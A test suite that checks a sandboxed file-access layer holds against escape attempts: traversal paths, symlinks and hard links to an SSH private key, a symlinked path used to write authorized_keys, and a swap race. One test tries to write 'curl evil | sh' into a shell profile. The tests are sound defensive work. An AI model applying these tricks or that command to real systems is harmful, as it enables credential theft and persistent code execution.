// ctx.local.files against a real folder standing in for the person's home
// (docs/sandbox.md#files-in-detail). Each test tries one way past the declared patterns.

import { execFileSync } from 'node:child_process'
import { link, mkdir, mkdtemp, readFile, realpath, rename, rm, symlink, writeFile } from 'node:fs/promises'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import type { SandboxException } from '@valet/core'
import { afterEach, beforeEach, describe, expect, it } from 'vitest'
import { fileReach, localFiles, MAX_FILE_BYTES } from '../src/local/files'

let home: string
beforeEach(async () => {
  home = await realpath(await mkdtemp(join(tmpdir(), 'valet-home-')))
  await mkdir(join(home, 'Documents/Receipts/2026'), { recursive: true })
  await mkdir(join(home, 'Documents/Secret'), { recursive: true })
  await mkdir(join(home, '.ssh'), { recursive: true })
  await mkdir(join(home, 'Documents/Exports'), { recursive: true })
  await writeFile(join(home, 'Documents/Receipts/march.txt'), 'milk 3.10')
  await writeFile(join(home, 'Documents/Receipts/2026/april.txt'), 'bread 4.50')
  await writeFile(join(home, 'Documents/Secret/diary.txt'), 'private')
  await writeFile(join(home, '.ssh/id_ed25519'), 'KEY')
})
afterEach(async () => {
  await rm(home, { recursive: true, force: true })
})

const files = (exceptions: SandboxException[]) => localFiles(fileReach(exceptions, home), home)
const reads = (paths: string[]): SandboxException => ({
  kind: 'files',
  access: 'read',
  paths,
  purpose: 'test',
})
const writes = (paths: string[]): SandboxException => ({
  kind: 'files',
  access: 'read-write',
  paths,
  purpose: 'test',
})
const refusal = (p: Promise<unknown>) =>
  p.then(
    () => 'allowed',
    (e: { stage?: string; errorClass?: string }) => `${e.stage}/${e.errorClass}`,
  )

describe('reading under a declared pattern', () => {
  it('reads, lists and stats what the pattern covers, by ~/ or by the full path', async () => {
    const f = files([reads(['~/Documents/Receipts/**'])])
    expect(await f.read('~/Documents/Receipts/march.txt')).toBe('milk 3.10')
    expect(await f.read(join(home, 'Documents/Receipts/2026/april.txt').replace(home, '~'))).toBe(
      'bread 4.50',
    )
    expect(await f.read('~/Documents/Receipts/march.txt', { encoding: 'base64' })).toBe(
      Buffer.from('milk 3.10').toString('base64'),
    )
    const listed = await f.list('~/Documents/Receipts')
    expect(listed.map((e) => [e.name, e.kind])).toEqual([
      ['2026', 'directory'],
      ['march.txt', 'file'],
    ])
    expect(await f.stat('~/Documents/Receipts/march.txt')).toMatchObject({
      name: 'march.txt',
      kind: 'file',
      size: 9,
    })
  })

  it('keeps * to direct children and an exact path to itself', async () => {
    const children = files([reads(['~/Documents/Receipts/*'])])
    expect(await children.read('~/Documents/Receipts/march.txt')).toBe('milk 3.10')
    expect(await refusal(children.read('~/Documents/Receipts/2026/april.txt'))).toBe('tool-run/not-granted')
    const exact = files([reads(['~/Documents/Receipts/march.txt'])])
    expect(await exact.read('~/Documents/Receipts/march.txt')).toBe('milk 3.10')
    expect(await refusal(exact.list('~/Documents/Receipts'))).toBe('tool-run/not-granted')
  })

  it('refuses anything outside the patterns, and every kind when none is declared', async () => {
    const f = files([reads(['~/Documents/Receipts/**'])])
    expect(await refusal(f.read('~/Documents/Secret/diary.txt'))).toBe('tool-run/not-granted')
    expect(await refusal(f.list('~/Documents'))).toBe('tool-run/not-granted')
    const none = files([])
    expect(await refusal(none.read('~/Documents/Receipts/march.txt'))).toBe('tool-run/not-granted')
  })

  it('refuses paths that try to climb, or aren’t paths at all', async () => {
    const f = files([reads(['~/Documents/Receipts/**'])])
    for (const path of [
      '~/Documents/Receipts/../Secret/diary.txt',
      '~/Documents/Receipts/./march.txt',
      '~/Documents/Receipts//march.txt',
      'Documents/Receipts/march.txt',
      '~/Documents/Receipts/*',
      '~/Documents/Receipts/march.txt\u0000',
      '~/Documents/Receipts/marćh.txt'.normalize('NFD'),
      42,
      null,
    ]) {
      expect([path, await refusal(f.read(path as string))]).toEqual([path, 'tool-run/invalid'])
    }
  })

  it('matches case and Unicode the way the disk does, so case can’t dodge a pattern either way', async () => {
    const f = files([reads(['~/Documents/Receipts/**'])])
    // A case-insensitive volume finds it; a case-sensitive one doesn't. Either way it's in the pattern.
    const outcome = await refusal(f.read('~/documents/RECEIPTS/march.txt'))
    expect(['allowed', 'tool-run/not-found']).toContain(outcome)
  })

  it('refuses a symlink inside the pattern that points outside it', async () => {
    await symlink(join(home, 'Documents/Secret/diary.txt'), join(home, 'Documents/Receipts/link.txt'))
    await symlink(join(home, '.ssh'), join(home, 'Documents/Receipts/keys'))
    const f = files([reads(['~/Documents/Receipts/**'])])
    expect(await refusal(f.read('~/Documents/Receipts/link.txt'))).toBe('tool-run/denied-path')
    expect(await refusal(f.read('~/Documents/Receipts/keys/id_ed25519'))).toBe('tool-run/denied-path')
    expect(await refusal(f.list('~/Documents/Receipts/keys'))).toBe('tool-run/denied-path')
    // Listed, but as `other`, and never followed.
    expect((await f.list('~/Documents/Receipts')).find((e) => e.name === 'link.txt')?.kind).toBe('other')
  })

  it('follows a symlinked root to where it really is, and still keeps to it', async () => {
    // ~/Documents in iCloud Drive is a symlink to elsewhere: its pattern still works.
    await mkdir(join(home, 'Cloud/Notes'), { recursive: true })
    await writeFile(join(home, 'Cloud/Notes/a.md'), '# a')
    await symlink(join(home, 'Cloud/Notes'), join(home, 'Documents/Notes'))
    const f = files([reads(['~/Documents/Notes/**'])])
    expect(await f.read('~/Documents/Notes/a.md')).toBe('# a')
  })

  it('refuses a file with a second name, which the forbidden check can’t see', async () => {
    await link(join(home, '.ssh/id_ed25519'), join(home, 'Documents/Receipts/innocent.txt'))
    const f = files([reads(['~/Documents/Receipts/**'])])
    expect(await refusal(f.read('~/Documents/Receipts/innocent.txt'))).toBe('tool-run/denied-path')
  })

  it('refuses a FIFO, and a file over the size cap', async () => {
    execFileSync('mkfifo', [join(home, 'Documents/Receipts/pipe')])
    const big = join(home, 'Documents/Receipts/big.bin')
    await writeFile(big, Buffer.alloc(MAX_FILE_BYTES + 1))
    const f = files([reads(['~/Documents/Receipts/**'])])
    expect(await refusal(f.read('~/Documents/Receipts/pipe'))).toBe('tool-run/denied-path')
    expect(await refusal(f.read('~/Documents/Receipts/big.bin'))).toBe('tool-run/invalid')
  })

  it('answers a missing file as not-found, never with the OS’s words', async () => {
    const f = files([reads(['~/Documents/Receipts/**'])])
    const error = await f.read('~/Documents/Receipts/nope.txt').catch((e: unknown) => e)
    expect(error).toMatchObject({ stage: 'tool-run', errorClass: 'not-found' })
    expect(String((error as Error).message)).not.toContain(home)
  })
})

describe('writing under a read-write pattern', () => {
  it('writes and creates folders, replacing a file whole', async () => {
    const f = files([writes(['~/Documents/Exports/**'])])
    await f.mkdir('~/Documents/Exports/2026/q1')
    await f.write('~/Documents/Exports/2026/q1/report.csv', 'a,b\n')
    await f.write('~/Documents/Exports/2026/q1/report.csv', 'c,d\n')
    expect(await readFile(join(home, 'Documents/Exports/2026/q1/report.csv'), 'utf8')).toBe('c,d\n')
    await f.write('~/Documents/Exports/bytes.bin', Buffer.from([1, 2, 3]).toString('base64'), {
      encoding: 'base64',
    })
    expect([...(await readFile(join(home, 'Documents/Exports/bytes.bin')))]).toEqual([1, 2, 3])
  })

  it('refuses to write under a read pattern, or outside any pattern', async () => {
    const f = files([reads(['~/Documents/Receipts/**']), writes(['~/Documents/Exports/*'])])
    expect(await refusal(f.write('~/Documents/Receipts/march.txt', 'x'))).toBe('tool-run/not-granted')
    expect(await refusal(f.write('~/Documents/Exports/deep/x.txt', 'x'))).toBe('tool-run/not-granted')
    expect(await readFile(join(home, 'Documents/Receipts/march.txt'), 'utf8')).toBe('milk 3.10')
  })

  it('refuses to write through a symlinked folder or onto a symlink', async () => {
    await symlink(join(home, '.ssh'), join(home, 'Documents/Exports/keys'))
    await symlink(join(home, 'Documents/Secret/diary.txt'), join(home, 'Documents/Exports/diary.txt'))
    const f = files([writes(['~/Documents/Exports/**'])])
    expect(await refusal(f.write('~/Documents/Exports/keys/authorized_keys', 'ssh-ed25519 AAAA'))).toBe(
      'tool-run/denied-path',
    )
    expect(await refusal(f.write('~/Documents/Exports/diary.txt', 'overwritten'))).toBe(
      'tool-run/denied-path',
    )
    expect(await refusal(f.mkdir('~/Documents/Exports/keys/more'))).toBe('tool-run/denied-path')
    expect(await readFile(join(home, 'Documents/Secret/diary.txt'), 'utf8')).toBe('private')
  })
})

describe('an unsandboxed adapter’s open reach', () => {
  it('reads anything not forbidden, never Valet’s or the person’s credentials, and writes only to document folders', async () => {
    const f = localFiles({ kind: 'open' }, home)
    expect(await f.read('~/Documents/Secret/diary.txt')).toBe('private')
    expect(await refusal(f.read('~/.ssh/id_ed25519'))).toBe('tool-run/denied-path')
    await mkdir(join(home, 'Library/Application Support/Valet'), { recursive: true })
    await writeFile(join(home, 'Library/Application Support/Valet/approvals.json'), '{}')
    expect(await refusal(f.read('~/Library/Application Support/Valet/approvals.json'))).toBe(
      'tool-run/denied-path',
    )
    expect(await refusal(f.write('~/.zshrc', 'curl evil | sh'))).toBe('tool-run/denied-path')
    await f.write('~/Documents/Exports/ok.txt', 'ok')
  })

  it('refuses a symlink in an allowed place that leads to a forbidden one', async () => {
    await symlink(join(home, '.ssh'), join(home, 'Documents/Receipts/keys'))
    const f = localFiles({ kind: 'open' }, home)
    expect(await refusal(f.read('~/Documents/Receipts/keys/id_ed25519'))).toBe('tool-run/denied-path')
  })
})

describe('a swap after the check', () => {
  it('fails when the file is replaced between resolving and opening', async () => {
    // Simulated by racing a rename against many reads: none may return the secret.
    const f = files([reads(['~/Documents/Receipts/**'])])
    const target = join(home, 'Documents/Receipts/march.txt')
    const results: string[] = []
    for (let i = 0; i < 50; i++) {
      const read = f.read('~/Documents/Receipts/march.txt').catch(() => 'refused')
      await rm(target, { force: true })
      await symlink(join(home, 'Documents/Secret/diary.txt'), target).catch(() => {})
      results.push(await read)
      await rm(target, { force: true })
      await writeFile(target, 'milk 3.10')
    }
    expect(results).not.toContain('private')
    await rename(target, `${target}.bak`)
  })
})
